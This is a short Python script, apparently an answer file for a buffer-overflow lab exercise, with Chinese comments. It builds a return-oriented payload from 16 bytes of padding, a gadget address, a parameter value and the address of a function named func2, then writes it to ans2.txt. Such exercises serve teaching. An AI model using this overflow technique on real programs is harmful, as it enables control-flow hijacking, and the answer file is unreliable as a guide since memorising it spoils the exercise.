import sys

padding = b'A' * 16

gadget_addr = (0x4012c7).to_bytes(8, 'little')

param_val = (0x3f8).to_bytes(8, 'little')

func2_addr = (0x401216).to_bytes(8, 'little')

#组合
payload = padding + gadget_addr + param_val + func2_addr

with open("ans2.txt", "wb") as f:
    f.write(payload)

print("ans2.txt 生成成功！")